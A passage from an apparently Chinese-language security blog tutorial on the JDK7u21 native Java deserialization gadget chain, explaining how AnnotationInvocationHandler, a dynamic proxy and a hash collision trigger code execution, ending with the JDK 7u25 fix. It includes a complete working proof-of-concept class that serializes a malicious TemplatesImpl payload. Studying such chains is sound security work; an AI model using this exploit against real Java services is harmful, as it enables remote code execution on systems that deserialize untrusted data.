    }
}
```
执行成功弹出计算器
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311164017457.png)
## 原生反序列化利用链JDK7u21
当没有第三方库的存在时，Java反序列化如何利用？
JDK7u21这条利用链适用于≤7u21以前的版本。
### JDK7u21
Java反序列化核心在于触发“动态方法执行”的地方：
例如，
- CommonsCollections系列反序列化的核心点是那一堆Transformer，特别是其中的`InvokerTransformer`、`InstantiateTransformer`
- CommonsBeanutils反序列化的核心点是`PropertyUtils#getProperty`，因为这个方法会触发任意对象getter
那么JDK7u21的核心点则是`sun.reflect.annotation.AnnotationInvocationHandler`，之前只提到了该类会触发`Map#put`、`Map#get`的特点。
来看其`equalslmpl`方法：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240312094948911.png)
这个方法中有反射调用：`memberMethod.invoke(o)`，`memberMethod`来自于`this.type.getDeclaredMethods()`。
`equalsImpl`方法中将`this.type`类中所有方法遍历并执行了。
那么，若`this.type`是Templates类，则会调用到其中的`newTransformer()`或`getOutputProperties()`方法，进而触发代码执行。

#### 调用equalsImpl
`equalsImpl`是一个私有方法，在`AnnotationInvocationHandler#invoke`中被调用。回忆之前cc1说到的ysoserial作者利用LazyMap Gadget时用到的**Java对象代理**：
	作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法`__call`要用到`java.reflect.Proxy`：
	`Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);`
	`Proxy.newProxyInstance`的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。
	……
	回看`sun.reflect.annotation.AnnotationInvocationHandler`发现这个类其实就是一个`InvocationHandler`，如果将这个对象用Proxy进行代理，那么readObject时，只要调用任意方法就会进入到`AnnotationInvocationHandler.invoke`中，进而触发`LazyMap.get`

InvocationHandler是一个接口，只有一个invoke方法：
```java
public interface InvocationHandler { 
	public Object invoke(Object proxy, Method method, Object[] args) 
		throws Throwable; 
}
```
在使用`java.reflect.Proxy`动态绑定一个接口时，如果调用该接口中任意一个方法，会执行到`InvocationHandler#invoke`。执行invoke时，被传入的第一个参数是这个proxy对象，第二个参数是被执行的方法名，第三个参数是执行时的参数列表。

而`AnnotationInvocationHandler`就是一个`InvocationHandler`接口的实现，看其invoke方法：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240312101152190.png)
当方法名等于“equals”，且仅有一个Object类型参数时，会调用到`equalImpl`方法。
所以，现在需要找到一个**会在反序列化时对proxy调用equals方法的方法**。

#### 调用equals
比较Java对象，我们常用到两个方法：
- equals
任意Java对象都拥有`equals`方法，它通常用于比较两个对象是否是同一个引用。
- compareTo
是`java.lang.Comparable`接口的方法，通常被实现用于比较两个对象的值是否相等。

其实集合set会调用equals。set中储存的对象不允许重复，所以在添加对象的时候，势必会涉及到比较操作。

查看`HashSet`的`readObject`方法：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240312102714085.png)
使用到了`HashMap`,将对象保存在`HashMap`的key处来做去重。

`HashMap`就是数据结构里的哈希表,哈希表是由数组+链表实现的——哈希表底层保存在一个数组中，数组的索引由哈希表的`key.hashCode()`经过计算得到，数组的值是一个链表，所有哈希碰撞到相同索引的key-value，都会被链接到这个链表后面。
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240312104248361.png)
所以，为了触发比较操作，需要让 比较 与 被比较 的两个对象的哈希相同，这样才能被连接到同一条链表上，才会进行比较。
跟进`HashMap`的`put`方法：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240312104814546.png)
变量`i`就是“哈希”，当两个不同对象的`i`("哈希")相等时，才会执行到`key.equals(k)`，才会触发代码执行。
所以，需要让: proxy对象的“哈希”=TemplateImpl对象的“哈希”。

计算"哈希"的主要是这两行代码：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240312105346437.png)
将其中的关键逻辑提取出来，得到这个函数：
```java
public static int hash(Object k) {  
    int h = 0;  
    h ^= k.hashCode();  
    
    h^ = (h >>> 20) ^ (h >>> 12); 
    h = h ^ (h >>> 7) ^ (h >>> 4);  
    return h & 15;
}
```
只有一个变量`key.hashCode()`，所以proxy对象与TemplateImpl对象的“哈希”是否相等，取决于两个对象的`hashCode()`是否相等。
TemplateImpl的`hashCode()`是一个Native方法，每次运行都会发生变化，无法预测。
所以关注proxy的`hashCode()`，`proxy.hashCode()`仍然会调用到`AnnotationInvocationHandler#invoke`，进而调用到`AnnotationInvocationHandler#hashCodeImpl`。
查看hashCodeImpl方法：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240312110100067.png)
遍历了`memberValues`这个Map中的每个key和value，计算每个键的哈希码并乘以127，然后对值调用`memberValueHashCode()`方法即计算哈希，将结果与键的哈希码乘以127的异或操作结果相加。

JDK7u21中巧妙地满足了：
- 当`memberValues`中只有一个key和一个value时，该哈希简化成`(127 * e.getKey().hashCode()) ^ value.hashCode()`
- 当`key.hashCode()`等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成`value.hashCode() `
- 当`value`就是TemplateImpl对象时，这两个哈希就变成完全相等

所以，我们找到一个hashCode是0的对象作为`memberValues`的key，将恶意TemplateImpl对象作为value，这个proxy计算的hashCode就与TemplateImpl对象本身的hashCode相等了。
爆破找到一个hashCode是0的对象：`f5a5a608`

#### 构造Poc
整个的利用过程:
- 首先生成恶意`TemplateImpl`对象
- 实例化`AnnotationInvocationHandler`对象
  - 它的type属性是一个TemplateImpl类
  - 它的memberValues属性是一个Map，Map只有一个key和value，key是字符串`f5a5a608`，value是前面生成的恶意TemplateImpl对象
- 对这个`AnnotationInvocationHandler`对象做一层代理，生成proxy对象
- 实例化一个HashSet，这个HashSet有两个元素，分别是：
  - TemplateImpl对象
  - proxy对象
- 将HashSet对象进行序列化

反序列化触发代码执行流程：
- 触发HashSet的readObject方法，其中使用HashMap的key做去重
- 去重时计算HashSet中的两个元素的`hashCode()`，构造二者相等，即可触发`equals()`方法
- 调用`AnnotationInvocationHandler#equalsImpl`方法
- `equalsImpl`中遍历`this.type`的每个方法并调用
- 因为`this.type`是TemplatesImpl类，所以触发了`newTransform()`或`getOutputProperties()`方法
- 任意代码执行

最终Poc:
```java

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.codec.binary.Base64;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class JDK7u21 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
        });
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        String zeroHashCodeStr = "f5a5a608";

        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        // 实例化AnnotationInvocationHandler类
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);

        // 实例化HashSet，并将两个对象放进去
        HashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        // 将恶意templates设置到map中
        map.put(zeroHashCodeStr, templates);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(set);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```
执行成功弹出计算器
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240312114001273.png)
#### 修复
官方在JDK7u25中修复这个问题：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240312114324775.png)
在`sun.reflect.annotation.AnnotationInvocationHandler`类的readObject函数中，原本有一个对`this.type`的检查，在其不是AnnotationType的情况下，会抛出一个异常。但是，捕获到异常后没有做任何事情，只是将这个函数返回了，这样并不影响整个反序列化的执行过程。

新版中，将`return;`修改成`throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");`，这样反序列化时会出现一个异常，导致整个过程停止
例如，使用JDK 7u25运行则会出错：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240312115158984.png)
其实这样的修复方式，仍然存在隐患，导致了另一条JDK 8u20的原生利用链。





